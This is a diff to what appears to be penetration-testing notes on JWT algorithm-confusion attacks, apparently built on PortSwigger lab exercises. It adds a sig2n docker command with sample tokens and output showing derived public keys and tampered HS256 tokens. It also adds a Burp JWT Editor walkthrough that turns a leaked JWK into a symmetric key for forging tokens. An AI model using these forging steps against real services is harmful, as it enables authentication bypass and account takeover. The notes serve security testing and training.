@@ -151,7 +151,23 @@ Other way for obtaining the keys:
 
 - [Finding Public Keys · ticarpi/jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys)
 - Public keys exposed as JWK objects on standard endpoint ( `/jwks.json` or `/.wll-known/jwks.json`)
-- [Extract it from a pair of existing JWTs](https://github.com/silentsignal/rsa_sign2n)
+- Extract it from a pair of existing JWTs using `jwt_forgery.py` [^burp][^rsa_sign2n]
+ 
+[^rsa_sign2n]: https://github.com/silentsignal/rsa_sign2n
+[^burp]: https://portswigger.net/web-security/jwt/algorithm-confusion#deriving-public-keys-from-existing-tokens:~:text=Solved-,Deriving%20public%20keys%20from%20existing%20tokens,-In%20cases%20where
+
+```bash
+$ sudo docker run --rm -it portswigger/sig2n eyJraWQiOiJkOGQ1MTdjZC0yZDE3LTQwZGQtODg5OC01MDVkNjI0MmY3ZmMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4ODA0MjM2M30.Far0LlkY5xSzXkYvVIZ5DWVPIuiTEyPODX816Y9sc5V_-fKbyxfU_b3fQ_C7P75COvlfkK-khPfDtYxvPfRxAMcXPwmxL4iznHznlHr9qOUZwKs0C2p57fC1zGQT754s66SD40uBcnc6cmgyEzBQ2QeCSpttdJOfAKLBcpyRsVsRK7yvkJewfpcM8CyvrjTVLfB8Js6kCnphXhay5O635eXoMLjBCtX9FNLXKJRluAcpXaIqjYZjyeKXIq074thKiv86LUNUbaF5MvzDb_P2k8XgWu-X63872-skI2P_sEoLvUbdL9FOIZIfNe7ZiZpIM_6FZ9TLqaOZrs-4ws3qcw eyJraWQiOiJkOGQ1MTdjZC0yZDE3LTQwZGQtODg5OC01MDVkNjI0MmY3ZmMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4ODA0MjY5MH0.IAqabPGgli1OHWtqDCzhudH3ygv4gqVlfg-6CE5rLuTt7v0onLRW24DXPj3wV6WrBxSFLelIWCLYhASIdWopTATybNDVSjR0D3U6kG66lQ-kQwW9dYaidoEYib0e9ehhd33xhardSmPi9FirF4k12ghgUmKgocPbrHTh2AaSQYa3uxWC2eh9vWIiq9nrfvXW88JTQGjRnFvs71t3aiYvQx2hsKBk3yBy4ml7sWOZ3twAJbDuui-FXoMIJmNp4wZM0JYcNDSQY3WUJom_QwXMZz6sZcAeDQRTdOzkwkRM9s3R1EdBIXWqTBMJL8K7JC415cUFUzL44SEwufv5YkGeYA
+Running command: python3 jwt_forgery.py <token1> <token2>
+
+...
+
+Found n with multiplier 5:
+    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFyWkxBQjlTa2tZN0pST2dkRkZyTAo1aVBBbjMwTlJ6bzZObnRVYmc2ZzRyZzlkWkpOSUZzQjh4eXI4TUlHV3VDZ2Nlc3Y4bUthQVpRbWR2VDRQRHBzCkw1cUgvMngwMHdzZXdVY2hteWxSNjFDYy91NFJ2REMzQXpoQ2hwcmNQTW4xbUFrRjJlY0tXWFphNFFXejR3cHcKYkdneXJHYmg1bTNmb0xLL241TkRmUFBKWVNybWZ3elpwemJvUlRoVzY2cWpTVmZjSEMyZ3Z2MW16VUNLWER6WAptMnArdStaM0VKaGdNS1lMd2tva2h6YmhYNERtYm9XZ1Jaai9jMXhwcjNndzNXUk1HMGFUS0FyZW9PVVZKTEJ2CmNVVFVyYzZhWU5YSGVObVZQemZUMnlBUDNFZ0pXTm9zaTdSMElGOU90amJIaUN6aG9GbjM5d3lmWUFxSVZtMEkKTlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+    Tampered JWT: eyJraWQiOiJkOGQ1MTdjZC0yZDE3LTQwZGQtODg5OC01MDVkNjI0MmY3ZmMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjg4MTI1NjUxfQ.2zkjRMjuX4LM9JGgK_Hly3C2NVPD66hSb8y8U-8p820
+    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXJaTEFCOVNra1k3SlJPZ2RGRnJMNWlQQW4zME5Sem82Tm50VWJnNmc0cmc5ZFpKTklGc0IKOHh5cjhNSUdXdUNnY2VzdjhtS2FBWlFtZHZUNFBEcHNMNXFILzJ4MDB3c2V3VWNobXlsUjYxQ2MvdTRSdkRDMwpBemhDaHByY1BNbjFtQWtGMmVjS1dYWmE0UVd6NHdwd2JHZ3lyR2JoNW0zZm9MSy9uNU5EZlBQSllTcm1md3paCnB6Ym9SVGhXNjZxalNWZmNIQzJndnYxbXpVQ0tYRHpYbTJwK3UrWjNFSmhnTUtZTHdrb2toemJoWDREbWJvV2cKUlpqL2MxeHByM2d3M1dSTUcwYVRLQXJlb09VVkpMQnZjVVRVcmM2YVlOWEhlTm1WUHpmVDJ5QVAzRWdKV05vcwppN1IwSUY5T3RqYkhpQ3pob0ZuMzl3eWZZQXFJVm0wSU5RSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
+    Tampered JWT: eyJraWQiOiJkOGQ1MTdjZC0yZDE3LTQwZGQtODg5OC01MDVkNjI0MmY3ZmMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjg4MTI1NjUxfQ.CXRiQ0D3EDsuqWQFa9ttPaL77rTmfWW9P1pH8FKWXr4
+```
 
 Another example is a server that implements the following pseudo-code:
 ```javascript
@@ -170,6 +186,26 @@ function verify(token, secretOrPublicKey){
 ```
 
 If an attacker is able to leak the public key used by the server, it can pass a JWT signed using HS256 and that public key in order to create valid JWT token.
+
+>[!example]
+>Leaked JWKs from `/jwks.json`
+>```json
+>{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"aeabd399-c6dc-434f-82a1-3014205a0e8b","alg":"RS256","n":"rm0qmCqfCJ_nG8-MrRSPxfDOJ5DccqnU1JZv4wmnVk7mzETmHH-IyRlWFTBVQVC_Z0WBI0Y8NoOD_zWpNG3we_prPX6_-MHj6yYt6C7weccf7Gycu4TYu5n2CAIpFFu6izzHlfdfLMW5xe_aVv8lgygSe65b4JWKYWT_b8Ol7jxLldrSOfVDe9LhEKPpSNmEo04wuCsB1pCJ0gtTSZMz5tOMYGrXFtDPctUZwS3lExoA4UpVAUB4Z3LLOEUGfdAykv9a5k39_DP_TKjXTPuKyb0AEIyDVyrPi2V3bicyOI-2y-9FHMUTskcLc7S3qCPM1aDuJ-TM9OGyWtj9p3lzaw"}]}
+>```
+>1. With the extension loaded, in Burp's main tab bar, go to the **JWT Editor Keys** tab.
+>2. Click **New RSA** Key. In the dialog, paste the JWK that you obtained earlier and save.
+>3. Right click the key and select "*Copy Public Key as PEM*" (in this way we can avoid missing spaces or new lines).
+>4. Go to the **Decoder** tab and Base64-encode the PEM.
+>5. Go back to the **JWT Editor Keys** tab and click **New Symmetric Key**.
+>6. In the dialog, click **Generate** to generate a new key in JWK format.
+>7. Replace the generated value for the `k` parameter with a Base64-encoded PEM key that you just copied.
+>8. Save the key.
+>```json
+>{"kty": "oct","kid": "aeabd399-c6dc-434f-82a1-3014205a0e8b","k":"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFybTBxbUNxZkNKL25HOCtNclJTUAp4ZkRPSjVEY2NxblUxSlp2NHdtblZrN216RVRtSEgrSXlSbFdGVEJWUVZDL1owV0JJMFk4Tm9PRC96V3BORzN3CmUvcHJQWDYvK01IajZ5WXQ2Qzd3ZWNjZjdHeWN1NFRZdTVuMkNBSXBGRnU2aXp6SGxmZGZMTVc1eGUvYVZ2OGwKZ3lnU2U2NWI0SldLWVdUL2I4T2w3anhMbGRyU09mVkRlOUxoRUtQcFNObUVvMDR3dUNzQjFwQ0owZ3RUU1pNego1dE9NWUdyWEZ0RFBjdFVad1MzbEV4b0E0VXBWQVVCNFozTExPRVVHZmRBeWt2OWE1azM5L0RQL1RLalhUUHVLCnliMEFFSXlEVnlyUGkyVjNiaWN5T0krMnkrOUZITVVUc2tjTGM3UzNxQ1BNMWFEdUorVE05T0d5V3RqOXAzbHoKYXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="}
+>```
+>9. Now from the repeater we can edit our JWT as we want and finally sign it using the newly created key
+
+
 
 ## Advanced Tests
 
